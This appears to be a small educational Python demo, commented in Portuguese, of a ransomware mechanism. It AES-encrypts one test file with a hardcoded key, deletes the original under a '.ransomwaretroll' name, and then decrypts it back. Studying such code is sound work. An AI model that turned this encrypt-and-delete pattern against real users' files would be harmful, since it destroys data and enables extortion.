import os
import pyaes

## Parte 1: Criptografar o arquivo
file_name = "teste.txt"
try:
    # Abrir o arquivo original para leitura
    with open(file_name, "rb") as file:
        file_data = file.read()

    # Chave de criptografia
    key = b"testeransomwares"
    aes = pyaes.AESModeOfOperationCTR(key)

    # Criptografar os dados
    crypto_data = aes.encrypt(file_data)

    # Salvar o arquivo criptografado
    encrypted_file_name = file_name + ".ransomwaretroll"
    with open(encrypted_file_name, "wb") as encrypted_file:
        encrypted_file.write(crypto_data)

    # Remover o arquivo original
    os.remove(file_name)
    print(f"Arquivo '{file_name}' foi criptografado como '{encrypted_file_name}'.")
except FileNotFoundError:
    print(f"Arquivo '{file_name}' não encontrado para criptografia.")

## Parte 2: Descriptografar o arquivo
encrypted_file_name = "teste.txt.ransomwaretroll"
try:
    # Abrir o arquivo criptografado para leitura
    with open(encrypted_file_name, "rb") as encrypted_file:
        encrypted_data = encrypted_file.read()

    # Chave de descriptografia (mesma chave usada na criptografia)
    aes = pyaes.AESModeOfOperationCTR(key)

    # Descriptografar os dados
    decrypt_data = aes.decrypt(encrypted_data)

    # Salvar o arquivo descriptografado
    decrypted_file_name = "teste.txt"
    with open(decrypted_file_name, "wb") as decrypted_file:
        decrypted_file.write(decrypt_data)

    # Remover o arquivo criptografado
    os.remove(encrypted_file_name)
    print(f"Arquivo criptografado '{encrypted_file_name}' foi descriptografado como '{decrypted_file_name}'.")
except FileNotFoundError:
    print(f"Arquivo '{encrypted_file_name}' não encontrado para descriptografia.")
